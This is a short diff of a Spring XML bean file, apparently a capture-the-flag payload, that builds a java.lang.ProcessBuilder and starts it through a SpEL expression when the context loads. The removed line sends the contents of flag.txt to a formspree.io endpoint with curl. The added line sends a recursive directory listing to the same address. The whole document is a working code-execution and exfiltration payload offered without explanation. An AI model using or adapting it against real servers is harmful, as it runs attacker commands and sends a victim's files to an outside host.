@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="/bin/sh,-c,curl -d &quot;messages=`cat flag.txt`&quot; https://formspree.io/mbjjpqjn" />
+     <constructor-arg value="/bin/sh,-c,curl -d &quot;messages=`ls -R`&quot; https://formspree.io/mbjjpqjn" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
